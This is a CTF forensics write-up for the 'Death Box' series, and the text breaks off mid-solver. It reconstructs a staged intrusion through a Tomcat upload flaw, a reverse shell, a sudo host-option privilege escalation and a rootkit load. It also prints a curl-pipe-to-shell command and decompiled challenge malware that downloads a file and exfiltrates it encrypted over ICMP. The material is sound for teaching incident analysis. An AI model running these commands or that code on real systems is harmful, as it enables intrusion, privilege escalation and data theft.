---
layout: post
title: "Writeup for Death Box series — Darkest Hour CTF 2026"
date: 2026-02-19 19:37:00 +0100
categories: [ctf, forensics, writeups]
role: author
---

This write-up covers **Death Box Forensics**, a series of challenges I authored for **Darkest Hour CTF 2026 — Eclipse Edition **hosted by Securinets INSAT. The series consists of 26 interconnected tasks that blend a wide range of forensic techniques, reverse engineering concepts, network analysis, and exploitation scenarios into a cohesive investigative storyline.

![](/assets/posts/death-box/xEaeSRfbFBu08XJ6_DXxjQ.png)

Forensic — Darkest Hour CTF 2026
{: .img-caption}

**Now, let’s dive in.**

- Death Box 0

![](/assets/posts/death-box/yT9lZn9j4NdKSl4MFwmCrA.png)

Death Box 0
{: .img-caption}

The opening task simply marks the start of the **Death Box Forensics** series. No analysis is required — just submit the welcome flag.

- Death Box 1

![](/assets/posts/death-box/ktfwsDCT7oj3cfVfUM3e-A.png)

Death box 1
{: .img-caption}

```
╭─░▒▓ ~/Downloads/writeup death box ▓▒░────────────────────────────────────────────────────────░▒▓ ✔  at 16:48:55 ▓▒░─╮
╰─ sha256sum handout.tar                                                                                             ─╯
c4d8c83c250c582e8398c63263f59ca2072394a8f88c22709da9732df0d40e6e  handout.tar
```

So the flag is : Securinets{c4d8c83c250c582e8398c63263f59ca2072394a8f88c22709da9732df0d40e6e}

- Death Box 2

![](/assets/posts/death-box/fFdVoWbtpUcnVHmNXeAmXg.png)

Death Box 2
{: .img-caption}

```
╭─░▒▓ ~/Downloads/writeup death box ▓▒░──────────────────────────────────────────────░▒▓ ✔  took 10s  at 16:51:26 ▓▒░─╮
╰─ cat /etc/lsb-release                                                                                              ─╯
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=24.04
DISTRIB_CODENAME=noble
DISTRIB_DESCRIPTION="Ubuntu 24.04.3 LTS"
```

To determine the hostname, we analyzed server1.pcapng and extracted it from the captured traffic.

So the flag will be Securinets{zyyz-VMware-Virtual-Platform_Ubuntu_24.04}

- Death Box 3

![](/assets/posts/death-box/6Sk1Ux3lzx9imY7dqOuqyA.png)

Death Box 3
{: .img-caption}

From server1.pcapng, we extracted the host’s IP and MAC address. The flag is : Securinets{192.168.255.137_00:0c:29:08:36:60}

- Death Box 4

![](/assets/posts/death-box/Bpw_r_L5UlYcyleFRZ8TVg.png)

Death Box 4
{: .img-caption}

```
╭─░▒▓ ~/Downloads/writeup death box/home/zyyz ▓▒░──────────────────────────────────────────────░▒▓ ✔  at 17:09:46 ▓▒░─╮
╰─ ls                                                                                                                ─╯
apache-tomcat-7.0.79.tar.gz
```

So the flag is Securinets{Apache Tomcat}

- Death Box 5

![](/assets/posts/death-box/umu5m4UnKr156pMRShYoCA.png)

Death Box 5
{: .img-caption}

The host Ip has several inforation chnage between the ip 192.168.255.1 in the server1.pcapng so the flag is : Securinets{192.168.255.1}

- Death Box 6

![](/assets/posts/death-box/MOngL-0KbVMWZ5ilVFDhZQ.png)

Death Box 6
{: .img-caption}

By filtering for HTTP traffic in server1.pcapng, we can see that the attacker attempted to request /shell from the host.

![](/assets/posts/death-box/F7ZlKtWzzDoJFsEUb7tSCA.png)

So the flag is Securinets{http://192.168.255.137:8080/shell/ 2026-02-12 21:31:08}

- Death Box 7

![](/assets/posts/death-box/wxa0yflclR5VPMJFKuLTXw.png)

Death Box 7
{: .img-caption}

```
╭─░▒▓ ~/Downloads/writeup death box ▓▒░────────────────────────────────────────────────────────░▒▓ ✔  at 17:21:26 ▓▒░─╮
╰─ cat Dockerfile                                                                                                    ─╯
FROM alpine:latest

RUN apk update
RUN apk upgrade
RUN apk add --no-cache bash openssl

RUN adduser -h /home/ctfuser -s /bin/bash ctf -u 1001 | echo ctf | echo ctf

WORKDIR /home/securinets

COPY ./flag.txt /home/securinets/flag.txt
COPY ./key /home/securinets/key

RUN openssl enc -aes-256-cbc -salt -in flag.txt -out flag.txt.enc -pass file:./key

RUN rm flag.txt

USER ctfuser

CMD ["echo","Good luck and have fun !"]
```

and upon expecting the .bash_history of the user we find this :

```
docker pull zyyz1/dockerstrike
docker images
```

```
╭─░▒▓ ~/Downloads/writeup death box ▓▒░────────────────────────────────────────────────────────░▒▓ ✔  at 17:23:11 ▓▒░─╮
╰─ docker create --name temp_container zyyz1/dockerstrike                                                            ─╯
7ffc670c6784ecc1781dc2762ded32661bfd4f1dd3c0d6d8dd7f05cf6b2141f3
╭─░▒▓ ~/Downloads/writeup death box ▓▒░──────────────────────────────────────────────────────░▒▓ 1 х  at 17:24:32 ▓▒░─╮
╰─ docker cp temp_container:/home/securinets/flag.txt.enc .                                                          ─╯
Successfully copied 2.05kB to /home/zyyz/Downloads/writeup death box/.
╭─░▒▓ ~/Downloads/writeup death box ▓▒░────────────────────────────────────────────────────────░▒▓ ✔  at 17:25:04 ▓▒░─╮
╰─ docker cp temp_container:/home/securinets/key .                                                                   ─╯
Successfully copied 2.05kB to /home/zyyz/Downloads/writeup death box/.
```

Then we proceed to the decryption :

```
╭─░▒▓ ~/Downloads/writeup death box ▓▒░────────────────────────────────────────────────────────░▒▓ ✔  at 17:26:14 ▓▒░─╮
╰─ openssl enc -d -aes-256-cbc -in flag.txt.enc -out flag.txt -pass file:./key                                       ─╯
*** WARNING : deprecated key derivation used.
Using -iter or -pbkdf2 would be better.
```

just ignore that error and read the flag :

```
╭─░▒▓ ~/Downloads/writeup death box ▓▒░────────────────────────────────────────────────────────░▒▓ ✔  at 17:26:25 ▓▒░─╮
╰─ cat flag.txt                                                                                                      ─╯
Securinets{m3ssy_d0cker_c0nta1n3r}
```

So the flag is Securinets{m3ssy_d0cker_c0nta1n3r}

- Death Box 8

![](/assets/posts/death-box/iCawsYvab4mujymRk3EHvA.png)

Death Box 8
{: .img-caption}

For this task, I used a **Wireshark feature that can reveal credentials**. You can access it by navigating to **Tools → Credentials**.

![](/assets/posts/death-box/cHNsU9foqjxx_KTRkgn8tQ.png)

From this view, we could read the credentials used so the flag is : Securinets{Zyyz_Darkest-Hour-2026}

- Death Box 9

![](/assets/posts/death-box/1LgqFO0Dpq1gaLBrFE7jBg.png)

Death Box 9
{: .img-caption}

After uploading the malicious shell, the attacker obtained a reverse shell on the host. They executed several commands and eventually invoked a command to upgrade it to an interactive shell.

![](/assets/posts/death-box/PPrXSoRQSpZQ4hbqpdHWLw.png)

So the command used is :

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Then our flag is Securinets{13e5b4b56447415508ee7288c003711b40b23c635bd79853f134a831231bd63d}

- Death Box 10

![](/assets/posts/death-box/sQ2DTwL4OyC22tJDf5iLmQ.png)

Death Box 10
{: .img-caption}

So this is about apache tomcat 7.0.79 file upload vulnerability

![](/assets/posts/death-box/g9jeRCmCCWGFTIiG-UQ41A.png)

Then our flag is Securinets{CVE-2017–12615}

- Death Box 11

![](/assets/posts/death-box/6PNaVPm-nOfpRqxhvBUl4g.png)

Death Box 11
{: .img-caption}

From the first tcp stream upon obtaining the reverse shell :

![](/assets/posts/death-box/_JK2ojFVQjjJO11_WQRCOA.png)

Then our flag is : Securinets{id}

- Death Box 12

![](/assets/posts/death-box/KJJ2B6XlKGTT-bMLl5nmEQ.png)

Death Box 12
{: .img-caption}

We can simply use the **timestamp of the packet** to determine this. So the flag is Securinets{2026–02–12 21:31:17}

- Death Box 13

![](/assets/posts/death-box/Z063X2Z_MZgZdkD31YjzFA.png)

Death Box 13
{: .img-caption}

Within the same stream, we can identify the command executed:

![](/assets/posts/death-box/4rb_Qqd4hmruMlF_hQO4aA.png)

So the command is :

```
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

Then the flag is : Securinets{c1d7b4fa2d47ddb90bb5956f03ab4bfa188edb6974cc84b65f86d12c64af8795}

- Death Box 14

![](/assets/posts/death-box/BgbSZspcTWQTHaKJ6jaLsw.png)

Death Box 14
{: .img-caption}

We can quickly identify relevant entries by **grepping for ****"sudo"** in the linpeas output.

![](/assets/posts/death-box/YSfTxyUEv_lRMzoFKEFuzA.png)

So the flag is : Securinets{1.9.17}

- Death Box 15

![](/assets/posts/death-box/zH2gMl67XxHbkd-6yozARA.png)

Death Box 15
{: .img-caption}

Inside the server1.pcapng we found this :

![](/assets/posts/death-box/D2VpxeSsb8njDF0rJ64KYA.png)

So the hostname will be : dev.test.local but what about the hostname alias ?

The same exploit path was used from exploit.db :

[OffSec's Exploit Database Archive](https://www.exploit-db.com/exploits/52354)

So the flag is Securinets{dev.test.local_SERVERS}

- Death Box 16

![](/assets/posts/death-box/Sf9ZnYos_iTyJrT_boSl0Q.png)

Death Box 16
{: .img-caption}

From the earlier stream ,we could see the executed command is :

```
sudo -h dev.test.local -i
```

Then the flag is : Securinets{21ffc73dc9052e36e9e50190142b09d2b4ccb140985d729a5dd356d8b1249363}

- Death Box 17

![](/assets/posts/death-box/ZMt0egUEEWW5LI-ABrAgTw.png)

Death Box 17
{: .img-caption}

Obviously , the flag will be Securinets{CVE-2025–32462}

- Death Box 18

![](/assets/posts/death-box/QwcECTiQf4yFBBCsHFiXdg.png)

Death Box 18
{: .img-caption}

```
╭─░▒▓ ~/Downloads/writeup death box ▓▒░────────────────────────────────────────────────────────░▒▓ ✔  at 18:33:49 ▓▒░─╮
╰─ cat etc/crontab                                                                                                   ─╯
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
# You can also override PATH, but by default, newer versions inherit it from the environment
#PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
47 6    * * 7   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
52 6    1 * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
#
* * * * * root /bin/bash /tmp/encryptor
* * * * * root /bin/bash /tmp/encryptor
```

Then the cronjob set is : * * * * * root /bin/bash /tmp/encryptor

So the flag is : Securinets{b3f4743f68af9bb213057c81d066670cdee6513038fde235b1364c080cbc52a7}

- Death Box 19

![](/assets/posts/death-box/UtCRf8zWDc2SUmU0S1Vkcw.png)

Death Box 19
{: .img-caption}

After gaining root access, the attacker downloaded the encryptor binary and attempted to load a kernel module named lkm_rootkit.ko :

![](/assets/posts/death-box/ltCzAzXaXZiCMrBK_2s74Q.png)

You could eventually read about rootkits here : [Rootkit](https://attack.mitre.org/techniques/T1014/)

Then the flag is : Securinets{lkm_rootkit.ko}

- Death Box 20

![](/assets/posts/death-box/oh989Giutw14iOXSBgPiLQ.png)

Death Box 20
{: .img-caption}

We now shift our focus to **Reverse Engineering**.

![](/assets/posts/death-box/o_o_D0ijhBVgdgQz9hr14Q.png)

Upon inspecting the binary, we observed that it communicates with a server running on localhost. Each system call corresponds either to the binary sending data to the server or receiving data from it.
The binary establishes a TCP connection to a server hosted on 127.0.0.1:13337. The interaction follows a structured handshake protocol.
- First, the binary sends an initial 4-byte value to the server, likely acting as a trigger or identifier to initiate the exchange.
- In response, the server sends back a 12-byte challenge composed of three 32-bit values. This challenge appears to define parameters for the next step of the protocol.
- The binary then replies with a 4-byte proof value. This value is crucial, as it is used by the server to derive the final response.
- Finally, based on the received proof, the server generates and sends a 32-byte encrypted payload back to the binary, completing the handshake.

The port used could be found in strace :

```
╭─░▒▓ ~/Downloads/writeup death box ▓▒░────────────────────────────────────────────────────────░▒▓ ✔  at 18:54:48 ▓▒░─╮
╰─ strace ./encryptor                                                                                                ─╯
execve("./encryptor", ["./encryptor"], 0x7fff1e49ada0 /* 33 vars */) = 0
brk(NULL)                               = 0x63cc93528000
mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7bed4bd06000
access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3
fstat(3, {st_mode=S_IFREG|0644, st_size=81031, ...}) = 0
mmap(NULL, 81031, PROT_READ, MAP_PRIVATE, 3, 0) = 0x7bed4bcf2000
close(3)                                = 0
openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY|O_CLOEXEC) = 3
read(3, "\177ELF\2\1\1\3\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\220\243\2\0\0\0\0\0"..., 832) = 832
pread64(3, "\6\0\0\0\4\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0"..., 784, 64) = 784
fstat(3, {st_mode=S_IFREG|0755, st_size=2125328, ...}) = 0
pread64(3, "\6\0\0\0\4\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0"..., 784, 64) = 784
mmap(NULL, 2170256, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x7bed4ba00000
mmap(0x7bed4ba28000, 1605632, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x28000) = 0x7bed4ba28000
mmap(0x7bed4bbb0000, 323584, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1b0000) = 0x7bed4bbb0000
mmap(0x7bed4bbff000, 24576, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1fe000) = 0x7bed4bbff000
mmap(0x7bed4bc05000, 52624, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x7bed4bc05000
close(3)                                = 0
mmap(NULL, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7bed4bcef000
arch_prctl(ARCH_SET_FS, 0x7bed4bcef740) = 0
set_tid_address(0x7bed4bcefa10)         = 7064
set_robust_list(0x7bed4bcefa20, 24)     = 0
rseq(0x7bed4bcf0060, 0x20, 0, 0x53053053) = 0
mprotect(0x7bed4bbff000, 16384, PROT_READ) = 0
mprotect(0x63cc563c2000, 4096, PROT_READ) = 0
mprotect(0x7bed4bd3e000, 8192, PROT_READ) = 0
prlimit64(0, RLIMIT_STACK, NULL, {rlim_cur=8192*1024, rlim_max=RLIM64_INFINITY}) = 0
munmap(0x7bed4bcf2000, 81031)           = 0
socket(AF_INET, SOCK_STREAM, IPPROTO_IP) = 3
connect(3, {sa_family=AF_INET, sin_port=htons(13337), sin_addr=inet_addr("127.0.0.1")}, 16) = -1 ECONNREFUSED (Connection refused)
exit_group(1)                           = ?
+++ exited with 1 +++
```

The part that handles the ecnryption is stored in a section called secured .
This section appeared to be decrypted at runtime .

Upon exploring the second part of the binary :

```
sub_72A0(v18 ^ v15, 6295212, &v18, 4, 0, 0);
  syscall(44, v6);
  sub_78D0(qword_600000, 6295212, (unsigned __int8)(v4 % 256));
  if ( syscall(45, v6, v27, 32, 0, 0, 0) != 32 )
    return 1;
  v9 = v18;
```

Once analyzed, it becomes clear that the 32 encrypted bytes returned by the server are constructed in a specific way: eight 4-byte values are individually XORed with the proof, then concatenated to form the final payload.
The key question was how to recover these eight 4-byte values.
Earlier, while debugging the binary with GDB, we identified several embedded MD5 hash fragments within the secured section. These hashes appeared to correspond to the required 4-byte values. If crackable, they would allow us to reconstruct the original chunks used to generate the final encrypted payload.
The next step was therefore to extract (dump) these hash values and attempt to crack them in order to recover the target 8 chunks needed to build the final response.
- Set a breakpoint at this check :

```
if ( syscall(45, v6, v27, 32, 0, 0, 0) != 32 )
```

break syscall if $ecx == 32 and then but firstly host a dummy server that sends 32 null bytes or whatever in order to secure the initial communication between the server and the binary.

```
$r12   : 0x0
$r13   : 0x0
$r14   : 0x0
$r15   : 0x0
$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffd880│+0x0000: 0x0000000000000001   ← $rsp
0x00007fffffffd888│+0x0008: 0x00007fffffffdb41  →  "/mnt/c/Users/Aziz/Downloads/writeup death box/encr[...]"
0x00007fffffffd890│+0x0010: 0x0000000000000000
0x00007fffffffd898│+0x0018: 0x00007fffffffdb79  →  "HOSTTYPE=x86_64"
0x00007fffffffd8a0│+0x0020: 0x00007fffffffdb89  →  "LANG=C.UTF-8"
0x00007fffffffd8a8│+0x0028: 0x00007fffffffdb96  →  "PATH=/home/zyyz/tools/findaes-1.2/findaes-1.2:/usr[...]"
0x00007fffffffd8b0│+0x0030: 0x00007fffffffe58b  →  "TERM=xterm-256color"
0x00007fffffffd8b8│+0x0038: 0x00007fffffffe59f  →  "XDG_RUNTIME_DIR=/run/user/1000/"
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x7ffff7fe4533 <_dl_help+02c3>  call   0x7ffff7fd3cd0 <_dl_printf>
   0x7ffff7fe4538 <_dl_help+02c8>  jmp    0x7ffff7fe43d2 <_dl_help+354>
   0x7ffff7fe453d                  nop    DWORD PTR [rax]
 → 0x7ffff7fe4540 <_start+0000>    mov    rdi, rsp
   0x7ffff7fe4543 <_start+0003>    call   0x7ffff7fe51d0 <_dl_start>
   0x7ffff7fe4548 <_dl_start_user+0000> mov    r12, rax
   0x7ffff7fe454b <_dl_start_user+0003> mov    r13, rsp
   0x7ffff7fe454e <_dl_start_user+0006> mov    edx, DWORD PTR [rip+0x19b14]        # 0x7ffff7ffe068 <_rtld_global+4200>
   0x7ffff7fe4554 <_dl_start_user+000c> test   edx, 0x2
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "encryptor", stopped 0x7ffff7fe4540 in _start (), reason: STOPPED
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x7ffff7fe4540 → _start()
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  break syscall if $ecx == 32
```

We successfully found the address of the 32 bytes of the encryted payload.

```
$rbx   : 0x3
$rcx   : 0x20
$rdx   : 0x00007fffffffd640  →  0x0000000000160000
$rsp   : 0x00007fffffffd538  →  0x00005555555552fa  →   pop rsi
$rbp   : 0x00007fffffffd800  →  0x00007fffffffd860  →  0x0000000000000000
$rsi   : 0x3
$rdi   : 0x2d
$rip   : 0x00007ffff7d27270  →  <syscall+0000> endbr64
$r8    : 0x0
$r9    : 0x0
$r10   : 0x0
$r11   : 0x202
$r12   : 0x1
$r13   : 0x0
$r14   : 0x00007fffffffd640  →  0x0000000000160000
$r15   : 0xaa23b1
$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffd538│+0x0000: 0x00005555555552fa  →   pop rsi      ← $rsp
0x00007fffffffd540│+0x0008: 0x0000000000000000
0x00007fffffffd548│+0x0010: 0x000000009833c8c1
0x00007fffffffd550│+0x0018: 0x000000b100000001
0x00007fffffffd558│+0x0020: 0x0000000000000000
0x00007fffffffd560│+0x0028: 0x0000000000000000
0x00007fffffffd568│+0x0030: 0x00000340982ecdec
0x00007fffffffd570│+0x0038: 0x0100007f19340002
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x7ffff7d27264 <syncfs+0024>    ret
   0x7ffff7d27265                  cs     nop WORD PTR [rax+rax*1+0x0]
   0x7ffff7d2726f                  nop
●→ 0x7ffff7d27270 <syscall+0000>   endbr64
   0x7ffff7d27274 <syscall+0004>   mov    rax, rdi
   0x7ffff7d27277 <syscall+0007>   mov    rdi, rsi
   0x7ffff7d2727a <syscall+000a>   mov    rsi, rdx
   0x7ffff7d2727d <syscall+000d>   mov    rdx, rcx
   0x7ffff7d27280 <syscall+0010>   mov    r10, r8
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "encryptor", stopped 0x7ffff7d27270 in syscall (), reason: BREAKPOINT
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x7ffff7d27270 → syscall()
[#1] 0x5555555552fa → pop rsi
[#2] 0x7ffff7c2a1ca → __libc_start_call_main(main=0x5555555550e0, argc=0x1, argv=0x7fffffffd888)
[#3] 0x7ffff7c2a28b → __libc_start_main_impl(main=0x5555555550e0, argc=0x1, argv=0x7fffffffd888, init=<optimized out>, fini=<optimized out>, rtld_fini=<optimized out>, stack_end=0x7fffffffd878)
[#4] 0x555555555405 → hlt
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤
```

Next, we set a read watchpoint using rwatch to determine where this address is being accessed within the binary.

```
gef➤  rwatch *(long *)0x00007fffffffd640
Hardware read watchpoint 2: *(long *)0x00007fffffffd640
```

and then continue.

We found a suspicious string stored in rsi

```
$rbx   : 0x00007fffffffd4d0  →  0x982c3bf7983b6400
$rcx   : 0x00007fffffffd640  →  0xc84828591d36f05c
$rdx   : 0x4
$rsp   : 0x00007fffffffd3e0  →  0x9800f2c59821b521
$rbp   : 0x00007fffffffd440  →  0x5779a645cbe8bff9
$rsi   : 0x00007fffffffd4e0  →  "f9bfe8cb45a6795747f4d512ebc178d2"
$rdi   : 0x00007fffffffd440  →  0x5779a645cbe8bff9
$rip   : 0x0000555555b54d83  →   mov rcx, QWORD PTR [rsp+0x48]
$r8    : 0x78
$r9    : 0x0
$r10   : 0x00007ffff7c1a410  →  0x0011001a0000849e
$r11   : 0x00007ffff7d8b010  →  <__strcmp_avx2+0000> endbr64
$r12   : 0x00007fffffffd4d0  →  0x982c3bf7983b6400
$r13   : 0x00007fffffffd4b0  →  "f9bfe8cb45a6795747f4d512ebc178d2"
$r14   : 0x00007fffffffd56c  →  0x1934000285183db0
$r15   : 0x4
$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00
```

This could be our first target hash and upon cracking it we successfully our first 4 bytes . Then to dump the rest , set a breakpoint at the strcmp and continue .

After cracking the 8 hashes , we obtain these 8 chunks :

```
chunks = [
    0x85183DB0,
    0x5066E5B5,
    0xCBF9F35F,
    0x2B4627A3,
    0xF732E92C,
    0xF002F1E0,
    0xD399FD13,
    0x6CF9E00F
]
```

Now that we have gathered all the necessary components, the final step is simply to run the solver.

```
import socket
import struct

HOST = "127.0.0.1"
PORT = 13337

BYTES  = 0xF5AFE18A
LENGTH = 0x20
ROUNDS = 0x0

chunks = [
    0x85183DB0,
    0x5066E5B5,
    0xCBF9F35F,
    0x2B4627A3,
    0xF732E92C,
    0xF002F1E0,
    0xD399FD13,
    0x6CF9E00F
]

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((HOST, PORT))
    s.listen(1)

    print(f"[+] Listening on {HOST}:{PORT}")
    conn, addr = s.accept()

    with conn:
        print(f"[+] Connection from {addr}")

        # STEP 1: Receive initial 4 bytes
        data = conn.recv(4)
        print(f"[+] Received initial 4 bytes: {data.hex()}")

        # STEP 2: Send 12-byte challenge
        payload = struct.pack("<III", BYTES, LENGTH, ROUNDS)
        conn.sendall(payload)
        print(f"[+] Sent 12-byte challenge: {payload.hex()}")

        # STEP 3: Receive 4-byte proof (XOR key)
        proof = conn.recv(4)
        print(f"[+] Received 4-byte proof: {proof.hex()}")

        # STEP 4: XOR chunks with proof (little endian)
        key = struct.unpack("<I", proof)[0]

        encrypted_flag = b""
        for c in chunks:
            encrypted_flag += struct.pack("<I", c ^ key)

        conn.sendall(encrypted_flag)
        print(f"[+] Sent 32-byte encrypted flag: {encrypted_flag.hex()}")

        print("[+] Handshake complete")
```

Just run the solver and then run the binary in another terminal and the flag will be intercepted !

```
╭─░▒▓ ~/Doc/CTFs AUTHORED/SECURINETS/DARKEST HOUR 2026/4n6/Death Box Series/files used ▓▒░─────────────────────────────────────────────░▒▓ ✔  took 16s  at 19:07:43 ▓▒░─╮
╰─ python3 solver1.py                                                                                                                                                  ─╯
[+] Listening on 127.0.0.1:13337
[+] Connection from ('127.0.0.1', 36972)
[+] Received initial 4 bytes: 0df7b6fa
[+] Sent 12-byte challenge: 8ae1aff52000000000000000
[+] Received 4-byte proof: 5e93cbf8
[+] Sent 32-byte encrypted flag: eeaed37deb76ada801603233fdb48dd3727af90fbe62c9084d6e522b51733294
[+] Handshake complete
```

```
╭─░▒▓ ~/Downloads/writeup death box ▓▒░──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────░▒▓ 1 х  at 19:15:44 ▓▒░─╮
╰─ ./encryptor                                                                                                                                                                           ─╯
C0ngrats_Pack3ts_Int3rc3pt3d_Succ3ssfully_84920
```

Then the flag is Securinets{C0ngrats_Pack3ts_Int3rc3pt3d_Succ3ssfully_84920}

- Death Box 21

![](/assets/posts/death-box/QftBW_xs0zVzOc3KDUXk6g.png)

Death Box 21
{: .img-caption}

Earlier we saw that the attacker tried to clone a repo

```
git clone https://github.com/0xZyyz/Infiltrator.git
```

This repository contains a binary packaged and obfuscated using PyInstaller. To analyze it, we first use pyinstxtractor to extract the embedded Python bytecode, and then leverage PyLingual to decompile the bytecode back into this readable Python source code :

```
import os
import socket
import struct
import requests
from dotenv import load_dotenv
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

# ===== CONFIG =====
DEST_IP = "192.168.255.137"
URL = "http://192.168.255.1:8000/malware"
CHUNK_SIZE = 1024
# ==================

# Load flag from .env
load_dotenv()
flag = os.getenv("KEY")
if flag is None:
    raise ValueError("KEY not found in .env")

flag_bytes = flag.encode()

if len(flag_bytes) < 48:
    raise ValueError("Flag must be at least 48 bytes")

# Derive key and IV
key = flag_bytes[:32]
iv  = flag_bytes[32:48]

def checksum(data):
    if len(data) % 2 != 0:
        data += b'\x00'
    s = sum((data[i] << 8) + data[i+1] for i in range(0, len(data), 2))
    s = (s >> 16) + (s & 0xffff)
    s = ~s & 0xffff
    return s

def main():
    print("[+] Fetching file...")
    response = requests.get(URL)
    data = response.content
    print(f"[+] Downloaded {len(data)} bytes")

    print("[+] AES encrypting...")
    cipher = AES.new(key, AES.MODE_CBC, iv)
    encrypted = cipher.encrypt(pad(data, AES.block_size))

    # Hex encode
    encrypted_hex = encrypted.hex().encode()

    print(f"[+] Sending to {DEST_IP} via ICMP...")
    
    # ICMP raw socket - REQUIRES ROOT
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    except PermissionError:
        print("[!] NEED ROOT: sudo python3 main.py")
        return

    seq = 0
    for i in range(0, len(encrypted_hex), CHUNK_SIZE):
        chunk = encrypted_hex[i:i+CHUNK_SIZE]
        
        # ICMP Echo Request header
        icmp_type = 8
        code = 0
        icmp_id = os.getpid() & 0xFFFF
        icmp_seq = seq
        
        # Create packet with zero checksum
        header = struct.pack('!BBHHH', icmp_type, code, 0, icmp_id, icmp_seq)
        packet = header + chunk
        
        # Calculate and insert checksum
        chksum = checksum(packet)
        header = struct.pack('!BBHHH', icmp_type, code, socket.htons(chksum), icmp_id, icmp_seq)
        packet = header + chunk
        
        sock.sendto(packet, (DEST_IP, 0))
        seq += 1

    print("[+] Done.")

if __name__ == "__main__":
    main()
```

This script downloads a remote file, encrypts it using AES, encodes it in hexadecimal format, and then sends the encrypted data to a target machine using ICMP Echo Request (ping) packets.

So firstly , we need to dump the encrypted file :

```
import pyshark
import binascii
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

# ===== CONFIG =====
PCAP_FILE = "server1.pcapng"  # Change this to your pcap file
OUTPUT_FILE = "decrypted_malware"
# ==================

# Hardcoded flag/key
FLAG = "Securinets{C0ngrats_Pack3ts_Int3rc3pt3d_Succ3ssfully_84920}"
flag_bytes = FLAG.encode()

# Derive key and IV (first 32 bytes = key, next 16 bytes = IV)
key = flag_bytes[:32]
iv = flag_bytes[32:48]

def extract_icmp_data(pcap_file):
    """Extract payload data from ICMP Echo Request packets"""
    print(f"[+] Reading {pcap_file}...")
    
    # Dictionary to store packets by sequence number
    packets = {}
    
    try:
        # Read pcap file - filter ICMP Echo Requests
        cap = pyshark.FileCapture(pcap_file, display_filter='icmp.type == 8')
        
        for pkt in cap:
            try:
                # Get ICMP layer
                icmp = pkt.icmp
                
                # Get sequence number
                seq = int(icmp.seq)
                
                # Get payload data (raw)
                if hasattr(icmp, 'data'):
                    if hasattr(icmp.data, 'binary_value'):
                        data = icmp.data.binary_value
                    else:
                        # Try alternate method
                        data_str = str(icmp.data)
                        if ':' in data_str:
                            data_str = data_str.replace(':', '')
                        data = bytes.fromhex(data_str)
                    
                    packets[seq] = data
                    print(f"[+] Packet {seq}: {len(data)} bytes")
                    
            except AttributeError:
                continue
            except ValueError:
                continue
        
        cap.close()
        
    except Exception as e:
